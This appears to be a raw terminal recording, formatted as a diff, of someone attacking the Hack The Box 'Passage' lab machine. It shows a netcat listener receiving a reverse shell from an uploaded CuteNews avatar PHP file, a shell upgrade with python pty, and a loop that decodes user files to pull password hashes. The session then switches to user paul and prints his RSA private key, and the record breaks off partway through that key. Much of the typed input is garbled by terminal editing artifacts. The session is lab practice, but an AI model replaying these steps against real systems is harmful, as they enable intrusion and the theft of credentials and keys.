@@ -1,0 +1,299 @@
+Script started on 2021-04-02 19:53:24+01:00 [TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="146" LINES="32"]
+[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mnc -lnvp 9001
+[?2004llistening on [any] 9001 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.206] 42134
+bash: cannot set terminal process group (1616): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@passage:/var/www/html/CuteNews/uploads$ pytjo  hon  3 -c 'import pyt; pty.spawn{(  (' "bin/bash"         /bin/bash")'
+python3 -c 'import pyt; pty.<tml/CuteNews/uploads$ python3 -c 'import pyt; pty.s                         pawn("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+ImportError: No module named 'pyt'
+www-data@passage:/var/www/html/CuteNews/uploads$ pythn on3 -c 'import pty; ptr y.spawn("/bin/bash"0 )'
+python3 -c 'import pty; pty.<tml/CuteNews/uploads$ python3 -c 'import pty; pty.s                         pawn("/bin/bash")'
+www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
+[1]+  Stopped                 nc -lnvp 9001
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mstty raw -echo
+[?2004l[?2004h[0;31m┌─[[0;39muser[01;33m@[01;96mparrot-virtual[0;31m]─[[0;32m~/htb/passage[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[?2004lnc -lnvp 9001
+
+www-data@passage:/var/www/html/CuteNews/uploads$ 
+www-data@passage:/var/www/html/CuteNews/uploads$ expot rt TR ERM=xterm
+www-data@passage:/var/www/html/CuteNews/uploads$ [H[2Jwww-data@passage:/var/www/html/CuteNews/uploads$ ls
+avatar_egre55_ykxnacpt.php  avatar_s0EaApU6gc_s0EaApU6gc.php
+avatar_hacker_jpyoyskt.php
+www-data@passage:/var/www/html/CuteNews/uploads$ pwd
+/var/www/html/CuteNews/uploads
+www-data@passage:/var/www/html/CuteNews/uploads$ ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:78:89  
+          inet addr:10.10.10.206  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:7889/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:7889/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:38870 errors:0 dropped:380 overruns:0 frame:0
+          TX packets:28868 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:3003824 (3.0 MB)  TX bytes:2631734 (2.6 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:38 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:38 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:4158 (4.1 KB)  TX bytes:4158 (4.1 KB)
+
+www-data@passage:/var/www/html/CuteNews/uploads$                   ccccccccccccccccccccccccccccccc ccccccccccccccccccccccccccccccccccccc
+cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc: command not found
+www-data@passage:/var/www/html/CuteNews/uploads$ [H[2Jwww-data@passage:/var/www/html/CuteNews/uploads$ stty row  s 32 cols 146
+www-data@passage:/var/www/html/CuteNews/uploads$ sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss sssssssssssssssssssssssssss
+ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss: command not found
+www-data@passage:/var/www/html/CuteNews/uploads$ [H[2Jwww-data@passage:/var/www/html/CuteNews/uploads$ ^C
+www-data@passage:/var/www/html/CuteNews/uploads$ 
+www-data@passage:/var/www/html/CuteNews/uploads$ ls
+avatar_egre55_ykxnacpt.php  avatar_hacker_jpyoyskt.php	avatar_s0EaApU6gc_s0EaApU6gc.php
+www-data@passage:/var/www/html/CuteNews/uploads$ cd .
+www-data@passage:/var/www/html/CuteNews/uploads$ ls
+avatar_egre55_ykxnacpt.php  avatar_hacker_jpyoyskt.php	avatar_s0EaApU6gc_s0EaApU6gc.php
+www-data@passage:/var/www/html/CuteNews/uploads$ cd ..
+www-data@passage:/var/www/html/CuteNews$ ls
+LGPL_CKeditor.txt  captcha.php	core	     example_fb.php  libs	 print.php   show_archives.php	snippet.php
+LICENSE.txt	   cdata	docs	     favicon.ico     migrations  rss.php     show_news.php	uploads
+README.md	   cn_api.php	example.php  index.php	     popup.php	 search.php  skins
+www-data@passage:/var/www/html/CuteNews$ find . | grep conf
+./cdata/conf.php
+./cdata/config.php
+./cdata/rss_config.php
+./cdata/confirmations.php
+./core/ckeditor/config.js
+./core/ckeditor/build-config.js
+./skins/emoticons/confused.gif
+./skins/base/dashboard/sysconf.php
+./skins/base/maint/sysconf.php
+./skins/base/confirm.tpl
+www-data@passage:/var/www/html/CuteNews$  ls
+LGPL_CKeditor.txt  captcha.php	core	     example_fb.php  libs	 print.php   show_archives.php	snippet.php
+LICENSE.txt	   cdata	docs	     favicon.ico     migrations  rss.php     show_news.php	uploads
+README.md	   cn_api.php	example.php  index.php	     popup.php	 search.php  skins
+www-data@passage:/var/www/html/CuteNews$ cd cdata/
+www-data@passage:/var/www/html/CuteNews/cdata$ ls
+Default.tpl	     btree	      conf.php		 flood.txt	 news		     replaces.php	  users
+Headlines.tpl	     cache	      config.php	 idnews.db.php	 news.txt	     rss.tpl		  users.db.php
+archives	     cat.num.php      confirmations.php  installed.mark  newsid.txt	     rss_config.php	  users.txt
+auto_archive.db.php  category.db.php  csrf.php		 ipban.db.php	 plugins	     template
+backup		     comments.txt     flood.db.php	 log		 postponed_news.txt  unapproved_news.txt
+www-data@passage:/var/www/html/CuteNews/cdata$ cd users
+www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
+09.php	16.php	32.php	5d.php	6e.php	7a.php	8f.php	a0.php	c8.php	d5.php	fa.php	lines
+0a.php	21.php	52.php	66.php	77.php	89.php	97.php	b0.php	d4.php	d6.php	fc.php	users.txt
+www-data@passage:/var/www/html/CuteNews/cdata/users$ find .      cat users.txt 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ find . -name "*.php"
+./97.php
+./d4.php
+./fa.php
+./c8.php
+./d5.php
+./32.php
+./0a.php
+./7a.php
+./66.php
+./8f.php
+./a0.php
+./89.php
+./fc.php
+./21.php
+./b0.php
+./09.php
+./16.php
+./d6.php
+./5d.php
+./6e.php
+./52.php
+./77.php
+www-data@passage:/var/www/html/CuteNews/cdata/users$ find . -name "*.php"f[1@f[1@o[1@r[1@ [1@i[1@j[1P[1@ [1@i[1@n[1@ [1@$[1@(find . -name "*.php")  ; do tail -1 % $i) ;    i | base64 -d ; donne
+> ^C
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; donne  e
+a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}base64: invalid input
+a:1:{s:4:"name";a:1:{s:10:"s0EaApU6gc";a:9:{s:2:"id";s:10:"1617389260";s:4:"name";s:10:"s0EaApU6gc";s:3:"acl";s:1:"4";s:5:"email";s:18:"s0EaApU6gc@hack.me";s:4:"nick";s:10:"s0EaApU6gc";s:4:"pass";s:64:"0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_s0EaApU6gc_s0EaApU6gc.php";s:6:"e-hide";s:0:"";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}base64: invalid input
+a:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:2:"id";a:1:{i:1617389260;s:10:"s0EaApU6gc";}}a:1:{s:5:"email";a:1:{s:18:"s0EaApU6gc@hack.me";s:10:"s0EaApU6gc";}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1598910911";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:20:"hacker@hacker.hacker";s:6:"hacker";}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; done[1@e[1@c[1@h[1@o[1@ [1@;
+a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}
+base64: invalid input
+
+a:1:{s:4:"name";a:1:{s:10:"s0EaApU6gc";a:9:{s:2:"id";s:10:"1617389260";s:4:"name";s:10:"s0EaApU6gc";s:3:"acl";s:1:"4";s:5:"email";s:18:"s0EaApU6gc@hack.me";s:4:"nick";s:10:"s0EaApU6gc";s:4:"pass";s:64:"0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_s0EaApU6gc_s0EaApU6gc.php";s:6:"e-hide";s:0:"";}}}
+a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
+base64: invalid input
+
+a:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}
+a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
+a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}
+a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}
+a:1:{s:2:"id";a:1:{i:1617389260;s:10:"s0EaApU6gc";}}
+a:1:{s:5:"email";a:1:{s:18:"s0EaApU6gc@hack.me";s:10:"s0EaApU6gc";}}
+a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
+a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
+a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
+a:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1598910911";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}
+a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}
+a:1:{s:5:"email";a:1:{s:20:"hacker@hacker.hacker";s:6:"hacker";}}
+a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}
+a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}
+www-data@passage:/var/www/html/CuteNews/cdata/users$ [H[2Jwww-data@passage:/var/www/html/CuteNews/cdata/users$ 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ 
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done
+a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}
+base64: invalid input
+
+a:1:{s:4:"name";a:1:{s:10:"s0EaApU6gc";a:9:{s:2:"id";s:10:"1617389260";s:4:"name";s:10:"s0EaApU6gc";s:3:"acl";s:1:"4";s:5:"email";s:18:"s0EaApU6gc@hack.me";s:4:"nick";s:10:"s0EaApU6gc";s:4:"pass";s:64:"0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:32:"avatar_s0EaApU6gc_s0EaApU6gc.php";s:6:"e-hide";s:0:"";}}}
+a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
+base64: invalid input
+
+a:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}
+a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
+a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}
+a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}
+a:1:{s:2:"id";a:1:{i:1617389260;s:10:"s0EaApU6gc";}}
+a:1:{s:5:"email";a:1:{s:18:"s0EaApU6gc@hack.me";s:10:"s0EaApU6gc";}}
+a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
+a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
+a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
+a:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1598910911";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}
+a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}
+a:1:{s:5:"email";a:1:{s:20:"hacker@hacker.hacker";s:6:"hacker";}}
+a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}
+a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done | grep =o  =oP   -oP [a-z- 0-9]{ 64}
+base64: invalid input
+0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+base64: invalid input
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done | grep -oP [a-z0-9]{664} | grep -v invalid
+base64: invalid input
+base64: invalid input
+0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done | grep -oP [a-z0-9]{664} | grep -v invalid       base64
+base64: invalid input
+base64: invalid input
+0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done | grep -oP [a-z0-9]{664} | grep -v base64invalid64}[K
+base64: invalid input
+0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+base64: invalid input
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
+www-data@passage:/var/www/html/CuteNews/cdata/users$ for i in $(find . -name "*.php"); do tail -1 $i | base64 -d ; echo ;done | grep -oP [a-z0-9]{664} | grep -v base64
+base64: invalid input
+base64: invalid input
+0944b4a57ad4b9ecbf4d2765306a6e7541a52a4ec87fbb09031598cf1efe72f1
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
+www-data@passage:/var/www/html/CuteNews/cdata/users$ ^C
+www-data@passage:/var/www/html/CuteNews/cdata/users$ su - paul
+Password: 
+su: Authentication failure
+www-data@passage:/var/www/html/CuteNews/cdata/users$ su - paul
+Password: 
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ [H[2J]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ ifconfig
+Command 'ifconfig' is available in '/sbin/ifconfig'
+The command could not be located because '/sbin' is not included in the PATH environment variable.
+This is most likely caused by the lack of administrative privileges associated with your user account.
+ifconfig: command not found
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ ls
+[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  examples.desktop  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  user.txt  [01;34mVideos[0m
+]0;paul@passage: ~[01;32mpaul@passage[00m:[01;34m~[00m$ cd .ssh
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ ls
+authorized_keys  id_rsa  id_rsa.pub  known_hosts
+]0;paul@passage: ~/.ssh[01;32mpaul@passage[00m:[01;34m~/.ssh[00m$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
++L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
+Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
+rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
+JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
+sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
+eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
+QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
+lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
+zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
+R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
